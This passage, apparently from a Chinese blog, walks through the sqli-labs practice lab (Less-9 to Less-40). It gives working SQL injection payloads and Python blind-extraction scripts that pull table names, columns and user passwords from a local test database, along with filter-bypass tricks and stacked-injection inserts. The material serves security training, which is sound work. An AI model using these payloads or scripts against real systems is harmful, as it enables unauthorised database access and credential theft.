class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if(length(database())=&quot; + str(i) + &quot;,sleep(4),1)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if(length((select table_name from information_schema.tables where table_schema=database() limit 3,1))=&quot; + str(i) + &quot;,sleep(4),1)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if(length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1))=&quot; + str(i) + &quot;,sleep(4),1)#&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or if(length((select password from users limit 0,1))=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,sleep(4),1)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url,params=data,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;【*】 present length: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            length = i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;【+】 right length: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPayload</span>():</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        left = ord(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">        right = ord(&#x27;z&#x27;)</span></span><br><span class="line"><span class="string">        while left != right:</span></span><br><span class="line"><span class="string">            mid = int((left + right) / 2)</span></span><br><span class="line"><span class="string">            payload = &quot;&#x27; or if(ASCII(mid(database(),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;,1,sleep(4))#&quot;</span></span><br><span class="line"><span class="string">            #payload = &quot;&#x27; or ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 4,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;</span></span><br><span class="line"><span class="string">            #payload = &quot;&#x27; or ASCII(mid((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;</span></span><br><span class="line"><span class="string">            #payload = &quot;&#x27; or ASCII(mid((select password from users limit 1,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;</span></span><br><span class="line"><span class="string">            data = &#123;</span></span><br><span class="line"><span class="string">                &#x27;id&#x27;:payload</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            try:</span></span><br><span class="line"><span class="string">                r = requests.get(url,params=data,timeout=3)</span></span><br><span class="line"><span class="string">                left = mid + 1</span></span><br><span class="line"><span class="string">                print(str(i) + &quot; &gt; &quot; + chr(mid))</span></span><br><span class="line"><span class="string">            except requests.exceptions.ReadTimeout as e:</span></span><br><span class="line"><span class="string">                right = mid</span></span><br><span class="line"><span class="string">                print(str(i) + &quot; &lt;= &quot; + chr(mid))</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">        password += chr(left)</span></span><br><span class="line"><span class="string">        print(&quot;【+】 password: &quot; + password)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; or if(ASCII(mid(database(),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j)) + &quot;,sleep(4),1)#&quot;</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; or if(ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j)) + &quot;,sleep(4),1)#&quot;</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; or if(ASCII(mid((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j)) + &quot;,sleep(4),1)#&quot;</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; or if(ASCII(mid((select password from users limit 0,1),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(j)) + <span class="string">&quot;,sleep(4),1)#&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url,params=data,timeout=<span class="number">3</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;【*】 present password: &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; = &quot;</span> + j)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                password += j</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;【+】 password: &quot;</span> + password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getLength()</span><br><span class="line">    getPayload()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h2 id="Less-10（双引号时间盲注）"><a href="#Less-10（双引号时间盲注）" class="headerlink" title="Less-10（双引号时间盲注）"></a>Less-10（双引号时间盲注）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Less-9 单引号改双引号</span><br></pre></td></tr></table></figure>



<h2 id="Less-11（用户名加密的单引号-union-注入）"><a href="#Less-11（用户名加密的单引号-union-注入）" class="headerlink" title="Less-11（用户名加密的单引号 union 注入）"></a>Less-11（用户名加密的单引号 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname = admin&#x27;#</span><br><span class="line"></span><br><span class="line">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line"></span><br><span class="line">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;#</span><br><span class="line"></span><br><span class="line">&#x27; union select 1,group_concat(password) from users#</span><br></pre></td></tr></table></figure>



<h2 id="Less-12（用户名加密的双引号括号-union-注入）"><a href="#Less-12（用户名加密的双引号括号-union-注入）" class="headerlink" title="Less-12（用户名加密的双引号括号 union 注入）"></a>Less-12（用户名加密的双引号括号 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname = admin&quot;)#</span><br><span class="line"></span><br><span class="line">less-11 单引号改双引号括号</span><br></pre></td></tr></table></figure>



<h2 id="Less-13（用户名的单引号括号双注入）"><a href="#Less-13（用户名的单引号括号双注入）" class="headerlink" title="Less-13（用户名的单引号括号双注入）"></a>Less-13（用户名的单引号括号双注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) union select count(*),concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a#</span><br><span class="line"></span><br><span class="line">admin&#x27;) union select count(*),concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a#</span><br><span class="line"></span><br><span class="line">admin&#x27;) union select count(*),concat(&#x27;~&#x27;,(select password from users limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a#</span><br></pre></td></tr></table></figure>



<h2 id="Less-14（用户名的双引号双注入）"><a href="#Less-14（用户名的双引号双注入）" class="headerlink" title="Less-14（用户名的双引号双注入）"></a>Less-14（用户名的双引号双注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less-13 单引号括号改双引号</span><br></pre></td></tr></table></figure>



<h2 id="Less-15（用户名的单引号布尔注入）"><a href="#Less-15（用户名的单引号布尔注入）" class="headerlink" title="Less-15（用户名的单引号布尔注入）"></a>Less-15（用户名的单引号布尔注入）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8088/sqli-labs-master/Less-15/&quot;</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">盲注结果：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">|- security</span></span><br><span class="line"><span class="string">    |- emails</span></span><br><span class="line"><span class="string">    |- referers</span></span><br><span class="line"><span class="string">    |- uagents</span></span><br><span class="line"><span class="string">    |- users</span></span><br><span class="line"><span class="string">        |- id</span></span><br><span class="line"><span class="string">        |- username</span></span><br><span class="line"><span class="string">        |- password</span></span><br><span class="line"><span class="string">            |- Dumb</span></span><br><span class="line"><span class="string">            |- ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLength</span>():</span><br><span class="line">    <span class="keyword">global</span> length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and length(database())=&quot; + str(i) + &quot;#&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1))=&quot; + str(i) + &quot;#&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1))=&quot; + str(i) + &quot;#&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27; and length((select password from users limit 0,1))=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;uname&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag.jpg&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            length = i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;【+】 right length: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------------------------------&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;【*】 wrong length: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPayload</span>():</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        right = <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> left != right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment">#payload = &quot;admin&#x27; and ASCII(mid(database(),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;</span></span><br><span class="line">            <span class="comment">#payload = &quot;admin&#x27; and ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;</span></span><br><span class="line">            <span class="comment">#payload = &quot;admin&#x27; and ASCII(mid((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;</span></span><br><span class="line">            payload = <span class="string">&quot;admin&#x27; and ASCII(mid((select password from users limit 0,1),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1))&gt;&quot;</span> + <span class="built_in">str</span>(mid) + <span class="string">&quot;#&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;uname&#x27;</span>:payload,</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>:<span class="number">123</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag.jpg&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot; &gt; &quot;</span> + <span class="built_in">chr</span>(mid))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot; &lt;= &quot;</span> + <span class="built_in">chr</span>(mid))</span><br><span class="line">        password += <span class="built_in">chr</span>(left)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;【+】 password: &quot;</span> + password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getLength()</span><br><span class="line">    getPayload()</span><br></pre></td></tr></table></figure>



<h2 id="Less-16（用户名的双引号括号布尔注入）"><a href="#Less-16（用户名的双引号括号布尔注入）" class="headerlink" title="Less-16（用户名的双引号括号布尔注入）"></a>Less-16（用户名的双引号括号布尔注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-17（用户名加密的单引号报错注入）"><a href="#Less-17（用户名加密的单引号报错注入）" class="headerlink" title="Less-17（用户名加密的单引号报错注入）"></a>Less-17（用户名加密的单引号报错注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-18（User-Agent-报错注入）"><a href="#Less-18（User-Agent-报错注入）" class="headerlink" title="Less-18（User-Agent 报错注入）"></a>Less-18（User-Agent 报错注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: &#x27; or updatexml(1,concat(&#x27;~&#x27;,(select table_name from information_schema where table_schema=database),&#x27;~&#x27;),1) or</span><br></pre></td></tr></table></figure>



<h2 id="Less-19（Referer-报错注入）"><a href="#Less-19（Referer-报错注入）" class="headerlink" title="Less-19（Referer 报错注入）"></a>Less-19（Referer 报错注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-20（User-Agent-报错注入）"><a href="#Less-20（User-Agent-报错注入）" class="headerlink" title="Less-20（User-Agent 报错注入）"></a>Less-20（User-Agent 报错注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上 burpsuite 修改 Cookie：</span><br><span class="line"></span><br><span class="line">Cookie: uname=&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line"></span><br><span class="line">Cookie: uname=&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;#</span><br><span class="line"></span><br><span class="line">Cookie: uname=&#x27; union select 1,2,group_concat(password) from users#</span><br></pre></td></tr></table></figure>



<h2 id="Less-21（User-Agent-加密报错注入）"><a href="#Less-21（User-Agent-加密报错注入）" class="headerlink" title="Less-21（User-Agent 加密报错注入）"></a>Less-21（User-Agent 加密报错注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less-20 单引号改单引号括号再用 base64 加密</span><br></pre></td></tr></table></figure>



<h2 id="Less-22（User-Agent-加密报错注入）"><a href="#Less-22（User-Agent-加密报错注入）" class="headerlink" title="Less-22（User-Agent 加密报错注入）"></a>Less-22（User-Agent 加密报错注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less-20 单引号改双引号再用 base64 加密</span><br></pre></td></tr></table></figure>



<h2 id="Less-23-（过滤注释）"><a href="#Less-23-（过滤注释）" class="headerlink" title="Less-23 （过滤注释）"></a>Less-23 （过滤注释）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; and &#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,2,group_concat(password) from users where &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="Less-24-（二次排序漏洞）"><a href="#Less-24-（二次排序漏洞）" class="headerlink" title="Less-24 （二次排序漏洞）"></a>Less-24 （二次排序漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先注册一个 admin&#x27;# 账号再修改 admin&#x27;# 的密码，新密码即为 admin 的密码。</span><br></pre></td></tr></table></figure>

<h2 id="Less-25-（过滤-or-amp-and）"><a href="#Less-25-（过滤-or-amp-and）" class="headerlink" title="Less-25 （过滤 or &amp; and）"></a>Less-25 （过滤 or &amp; and）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一次性关键词绕过 用 oorr 和 aandnd 绕过</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,2,group_concat(passwoorrd)  from users--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-25a（过滤-or-amp-and-）"><a href="#Less-25a（过滤-or-amp-and-）" class="headerlink" title="Less-25a（过滤 or &amp; and ）"></a>Less-25a（过滤 or &amp; and ）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">表面上是盲注，背地里是 less-25 无引号的 union 注入...</span><br></pre></td></tr></table></figure>



<h2 id="Less-26-（过滤空格和注释的报错注入）"><a href="#Less-26-（过滤空格和注释的报错注入）" class="headerlink" title="Less-26 （过滤空格和注释的报错注入）"></a>Less-26 （过滤空格和注释的报错注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本题全部空格都过滤了，所以采取报错注入</span><br><span class="line">or 用 || 代替，and 用 %26%26 代替（&amp;&amp;也过滤了）</span><br><span class="line">注释则用 ||&#x27;1 闭合</span><br><span class="line"></span><br><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),&#x27;~&#x27;),1)||&#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())%26%26(table_name=&#x27;user&#x27;)),&#x27;~&#x27;),1)||&#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(passwoorrd))from(users)),&#x27;~&#x27;),1)||&#x27;1</span><br></pre></td></tr></table></figure>



<h2 id="Less-26a（过滤空格和注释的布尔注入）"><a href="#Less-26a（过滤空格和注释的布尔注入）" class="headerlink" title="Less-26a（过滤空格和注释的布尔注入）"></a>Less-26a（过滤空格和注释的布尔注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格全部被过滤，此题又不能进行报错注入，所以采取布尔注入</span><br></pre></td></tr></table></figure>



<h2 id="Less-27-（过滤-nion-和-select-的-union-注入）"><a href="#Less-27-（过滤-nion-和-select-的-union-注入）" class="headerlink" title="Less-27 （过滤 nion 和 select 的 union 注入）"></a>Less-27 （过滤 nion 和 select 的 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union 注入：</span><br><span class="line">通过脚本可知空格可以用 %09、%0a-%0d 绕过</span><br><span class="line">非一次性关键词绕过，union 和 select 用大小写 unioN 和 selecT 绕过</span><br><span class="line"></span><br><span class="line">?id=&#x27;%0AunioN%0AselecT%0A1,2,group_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database()%0Aand%0A&#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27;%0AunioN%0AselecT%0A1,2,group_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=database()%0Aand%0Atable_name=&#x27;users&#x27;%0Aand%0A&#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27;%0AunioN%0AselecT%0A1,2,group_concat(column_name)%0Afrom%0Ausers%0Awhere%0A&#x27;1</span><br><span class="line">或者</span><br><span class="line">?id=&#x27;%0AunioN%0AselecT%0A1,(selecT%0Agroup_concat(password)%0Afrom%0Ausers),3%0A||&#x27;</span><br><span class="line"></span><br><span class="line">报错注入：</span><br><span class="line">其他与 less-26 类似</span><br><span class="line"></span><br><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(selecT(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#x27;~&#x27;),1)||&#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(selecT(group_concat(column_name))from(information_schema.columns)where(table_schema=database())%26%26(table_name=&#x27;users&#x27;)),&#x27;~&#x27;),1)||&#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(selecT(group_concat(password))from(users)),&#x27;~&#x27;),1)||&#x27;1</span><br></pre></td></tr></table></figure>



<h2 id="Less-27a（过滤-nion-和-select-的时间盲注）"><a href="#Less-27a（过滤-nion-和-select-的时间盲注）" class="headerlink" title="Less-27a（过滤 nion 和 select 的时间盲注）"></a>Less-27a（过滤 nion 和 select 的时间盲注）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双引号 + 时间盲注</span><br><span class="line">其他同 less-27</span><br></pre></td></tr></table></figure>



<h2 id="Less-28（过滤-nion-和-select-的-union-注入）"><a href="#Less-28（过滤-nion-和-select-的-union-注入）" class="headerlink" title="Less-28（过滤 nion 和 select 的 union 注入）"></a>Less-28（过滤 nion 和 select 的 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有个小bug，网上的 payload 都是 union 注入，但是我的空格不能用 %a0 绕过...所以只好用布尔盲注</span><br><span class="line"></span><br><span class="line">?id=1&#x27;)and(ascii(mid(database(),1,1))=115)and(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure>



<h2 id="Less-28a（过滤-union-和-select-的布尔注入）"><a href="#Less-28a（过滤-union-和-select-的布尔注入）" class="headerlink" title="Less-28a（过滤 union 和 select 的布尔注入）"></a>Less-28a（过滤 union 和 select 的布尔注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同 less-28</span><br></pre></td></tr></table></figure>



<h2 id="Less-29（WAF1）"><a href="#Less-29（WAF1）" class="headerlink" title="Less-29（WAF1）"></a>Less-29（WAF1）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这题是？？？签到题？？？</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,group_concat(password),3 from users--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-30（WAF2）"><a href="#Less-30（WAF2）" class="headerlink" title="Less-30（WAF2）"></a>Less-30（WAF2）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less-29 单引号改双引号</span><br></pre></td></tr></table></figure>



<h2 id="Less-31（WAF3）"><a href="#Less-31（WAF3）" class="headerlink" title="Less-31（WAF3）"></a>Less-31（WAF3）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less-29 单引号改双引号括号</span><br></pre></td></tr></table></figure>



<h2 id="Less-32（宽字节注入）"><a href="#Less-32（宽字节注入）" class="headerlink" title="Less-32（宽字节注入）"></a>Less-32（宽字节注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于 get 方法的宽字节注入，加 %df 绕过</span><br><span class="line"></span><br><span class="line">?id=%df&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">?id=%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=%df&#x27; union select 1,group_concat(password),3 from users--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-33（宽字节注入）"><a href="#Less-33（宽字节注入）" class="headerlink" title="Less-33（宽字节注入）"></a>Less-33（宽字节注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同 less-32</span><br></pre></td></tr></table></figure>



<h2 id="Less-34（用户名和密码加反斜杠）"><a href="#Less-34（用户名和密码加反斜杠）" class="headerlink" title="Less-34（用户名和密码加反斜杠）"></a>Less-34（用户名和密码加反斜杠）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于 post 的宽字节注入，又可以将 utf-8 转换为 utf-16 或 utf-32，例如将&#x27;转为 utf-16 为 %EF%BF%BD&#x27;/�&#x27;</span><br><span class="line"></span><br><span class="line">万能密码 �&#x27; or 1# 不知道为什么我的电脑只有这个能用</span><br><span class="line"></span><br><span class="line">admin=�&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# </span><br><span class="line"></span><br><span class="line">admin=�&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273# </span><br><span class="line"></span><br><span class="line">admin=�&#x27; union select 1,group_concat(password) from users# </span><br></pre></td></tr></table></figure>



<h2 id="Less-35（加反斜杠没引号的-union-注入）"><a href="#Less-35（加反斜杠没引号的-union-注入）" class="headerlink" title="Less-35（加反斜杠没引号的 union 注入）"></a>Less-35（加反斜杠没引号的 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,group_concat(password),3 from users--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-36（基于-get-的-mysql-real-escape-string-函数的-union-注入）"><a href="#Less-36（基于-get-的-mysql-real-escape-string-函数的-union-注入）" class="headerlink" title="Less-36（基于 get 的 mysql_real_escape_string() 函数的 union 注入）"></a>Less-36（基于 get 的 mysql_real_escape_string() 函数的 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同 less-32</span><br></pre></td></tr></table></figure>



<h2 id="Less-37（基于-post-的-mysql-real-escape-string-函数的-union-注入）"><a href="#Less-37（基于-post-的-mysql-real-escape-string-函数的-union-注入）" class="headerlink" title="Less-37（基于 post 的 mysql_real_escape_string() 函数的 union 注入）"></a>Less-37（基于 post 的 mysql_real_escape_string() 函数的 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同 less-34</span><br></pre></td></tr></table></figure>



<h2 id="Less-38（堆叠注入）"><a href="#Less-38（堆叠注入）" class="headerlink" title="Less-38（堆叠注入）"></a>Less-38（堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stacked injection：在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。所以我们可以利用分号进行多聚输入。</span><br><span class="line"></span><br><span class="line">?id=1&#x27;;insert into users(id,username,password) values(15,&#x27;less38&#x27;,&#x27;less38&#x27;) -- +</span><br></pre></td></tr></table></figure>



<h2 id="Less-39（堆叠注入）"><a href="#Less-39（堆叠注入）" class="headerlink" title="Less-39（堆叠注入）"></a>Less-39（堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values(16,&#x27;less39&#x27;,&#x27;less39&#x27;) -- +</span><br></pre></td></tr></table></figure>



<h2 id="Less-40（堆叠注入）"><a href="#Less-40（堆叠注入）" class="headerlink" title="Less-40（堆叠注入）"></a>Less-40（堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;);insert into users(id,username,password) values(17,&#x27;less40&#x27;,&#x27;less40&#x27;) -- +</span><br></pre></td></tr></table></figure>



